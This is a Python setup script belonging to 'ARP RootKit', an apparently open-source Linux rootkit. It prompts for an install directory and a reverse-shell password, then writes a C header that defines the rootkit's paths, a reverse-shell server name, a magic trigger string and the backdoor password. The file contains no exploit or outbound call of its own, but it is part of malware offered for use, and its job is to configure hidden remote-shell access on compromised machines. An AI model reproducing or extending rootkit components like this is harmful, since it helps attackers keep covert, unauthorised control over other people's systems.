#!/usr/bin/python
#    _  __  __     __
#   /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
#  / / / \ /      / \ (_) (_) (_ /  ) ( (_
#
## License
#
# Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
## Notes
#

import getpass
import os
import sys

if os.path.exists("arprk-conf.h"):
	print ("Skipping configuration, already configured ...")
	sys.exit(0)

home = input("Enter a $HOME dir [/home/diwou/arprootkit]: ")
if home == "":
	home = "/home/diwou/arprootkit"

password = ""
re_pass = "!"

while re_pass != password:
	password = ""
	while password == "":
		password = getpass.getpass("Password for reverse shell: ")

	re_pass = ""	
	while re_pass == "":
		re_pass = getpass.getpass("Re-type password: ")

	if re_pass != password:
		print("\nPassword doesn't match!\n")

rshell_path = "rshsrv"

print ("\n\n")
print ("ARPRK Configuration:")
print ("\t$HOME                  = %s" % home)
#print ("\tReverse shell password = %s" % password)

f = open("arprk-conf.h", "w")
f.write("#ifndef ARPRK_CONF_H\n\n")
f.write("#define ARPRK_HOME \"%s\"\n" % home)
f.write("#define RSHELL_PATH ARPRK_HOME \"/%s\"\n" % rshell_path)
f.write("#define RSHELL_MAGIC \"OLA K ASE\"\n")
f.write("#define RSHELL_PASSWORD \"%s\"\n" % password)
f.write("\n#define ARPRK_CONF_H\n\n#endif")
f.close()
